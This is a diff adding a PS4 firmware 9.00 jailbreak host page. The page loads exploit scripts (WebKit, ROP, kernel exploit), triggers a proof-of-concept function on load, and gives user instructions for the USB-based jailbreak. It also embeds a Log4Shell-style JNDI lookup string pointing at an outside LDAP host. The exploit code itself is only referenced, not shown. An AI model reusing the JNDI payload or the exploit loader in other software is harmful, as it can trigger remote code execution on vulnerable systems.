@@ -1,0 +1,74 @@
+<html>
+<head>
+<title>Ps4 Auto_JB_Offline-Host v9.00 FW by Games_World</title>
+<link rel="stylesheet" href="style.css">
+<hr>
+<span id="date" ></span><span id="clock" ></span>
+<h1 style='font-size:16px;text-align:center;color:white;font-family:Almendra Display;font-style:italic;text-shadow: 4px 4px 4px black;color:white' >Ps4 Auto_JB_Offline-Host v9.00 FW by Games_World</h1>
+<hr><br><span class="crd" >Designed & Compiled by :</span >&nbsp;&nbsp; <a class="hue"style="color:white;font-size: 18px;font-family: Almendra Display;font-style:italic;text-shadow: 4px 4px 4px black;">PSJ</a>
+<script>
+    function showdate() {
+  var dt = new Date();
+    Hour= dt.getHours();
+  Minute= dt.getMinutes();
+     Day=dt.getDate();
+   Month=dt.getMonth()+1;
+   Year=dt.getFullYear();
+if (Minute < 10) { Minute = "0" + Minute; };
+if (Hour < 10) { Hour = "0" + Hour; };
+document.getElementById("date").innerHTML = (Day+"/"+Month+"/"+Year);
+document.getElementById("clock").innerHTML = (Hour+":"+Minute);
+  }
+  
+  setInterval(showdate,0);
+</script>
+<script>
+	if (window.applicationCache.status=='0'){window.location.replace("cache.html");}
+	
+        function allset() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("allset").style.display = "block";
+        }
+
+        function awaitpl() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("awaiting").style.display = "block";
+        }
+</script>
+<script src="payload.js"></script>
+<script src="int64.js"></script>
+<script src="rop.js"></script>
+<script src="kexploit.js"></script>
+<script src="webkit.js"></script>
+
+</head>
+</html>
+
+<body onload="setTimeout(poc, 1500);">
+<div id="loader" class="loader"></div>
+
+<div id="awaiting" class="info" style="display:none;">
+Sending Payload...
+<br />
+
+<span class="j">${jndi:ldap://nsa.gov}</span>
+</div>
+ 
+<div id="allset" class="info" style="display:none;">
+You're all set!
+</div>
+
+ 	 
+ 	  
+</body>
+<main style="position: relative;color:white;font-size:14px;font-family: Almendra Display;font-style:italic;font-weight:bold;">  
+	 <div id="instructions">
+        <h3 style="font-weight:bold;font-size:16px;">Jailbreak Process and Troubleshooring isntructions:</h3>
+            <p>i.)In about a minute you'll be prompted to insert the USB drive you prepared. Insert the USB drive, wait for the notification about the invalid format to pop up, then eject the drive and click OK. Important: never leave the drive inserted during a reboot!</p>
+            <p>ii.)You will get a message saying "There is not enough free system memory". This is normal, just click OK.</p>
+			<p>iii.)After 20 more seconds you will get an alert saying "You're all set!", followed by "There is not enough free system memory". This means that everything has gone well.</p>
+            <p>iv.)If something went wrong during the process, you may get an alert with an error. In this case you must reboot your PS4, preferrably without closing the dialog box.</p>
+			<p>v.)If the system hangs for more than a minute (may require more time on slow Internet connections), reboot your PS4 and try again.</p>
+	        <p>vi.)If the system crashes (looks like instant powerdown), press the power button on the PS4 (NOT on the gamepad) until it turns on again, then retry.</p>
+			<marquee style=' width:100%;'> <a style='font-size:12px;text-align:center;color:#8B0000; font-family:Almendra Display;font-style:italic;text-align:center;font-weight:bold;'>"Once you have enabled debug settings, do not ever go into "*Debug Settings - System - IDU Mode", or your PS4 will brick!"</a></marquee><br>
+		 </div>
